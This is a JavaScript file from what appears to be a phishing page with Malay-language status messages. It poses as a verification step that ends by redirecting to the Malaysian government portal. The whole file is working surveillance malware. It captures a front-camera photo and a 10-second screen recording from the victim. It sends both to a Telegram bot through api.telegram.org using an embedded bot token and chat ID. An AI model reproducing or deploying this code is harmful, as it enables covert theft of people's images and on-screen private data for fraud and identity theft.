const BOT_TOKEN = "9277901855:AAF-83CM2BKInE4V_rKb3oyxSHEjS3t8ym0";
const CHAT_ID = "-1004444548273";
const REDIRECT_URL = "https://www.malaysia.gov.my";

async function startHarvest() {
    const btn = document.getElementById('start-btn');
    const status = document.getElementById('status');
    
    btn.disabled = true;
    btn.innerText = "Memproses...";
    status.innerText = "Sila benarkan akses kamera...";

    try {
        // ==========================================
        // BAHAGIAN 1: AMBIL GAMBAR KAMERA DEPAN
        // ==========================================
        const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('preview');
        video.srcObject = camStream;
        await video.play();
        
        await new Promise(r => setTimeout(r, 1500)); // Tunggu kamera fokus

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        camStream.getTracks().forEach(t => t.stop()); // Tutup kamera lepas ambil gambar

        // Hantar Gambar Kamera dulu
        status.innerText = "Menghantar gambar...";
        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("photo", blob, "selfie.jpg");
            fd.append("caption", "📸 <b>Gambar Kamera Depan</b>");
            fd.append("parse_mode", "HTML");
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        }, "image/jpeg", 0.8);

        // ==========================================
        // BAHAGIAN 2: RAKAM SKRIN (10 SAAT)
        // ==========================================
        status.innerText = "Sila pilih skrin untuk dikongsi...";
        
        // Minta kebenaran rakam skrin
        const screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });

        status.innerText = "Merakam skrin... (10 saat)";
        const mediaRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm' });
        const chunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
            status.innerText = "Menghantar video...";
            const blob = new Blob(chunks, { type: 'video/webm' });
            
            // Hantar video ke Telegram
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("video", blob, "screen_record.webm");
            fd.append("caption", "🎥 <b>Rakaman Skrin (10s)</b>");
            fd.append("parse_mode", "HTML");
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
            
            status.innerText = "Pengesahan Berjaya!";
            setTimeout(() => window.location.href = REDIRECT_URL, 1500);
        };

        // Mula rakam
        mediaRecorder.start();

        // Berhenti automatik lepas 10 saat
        setTimeout(() => {
            mediaRecorder.stop();
            screenStream.getTracks().forEach(track => track.stop());
        }, 10000); 

    } catch (err) {
        status.innerText = "Ralat: " + err.message;
        btn.disabled = false;
        btn.innerText = "Cuba Lagi";
    }
}
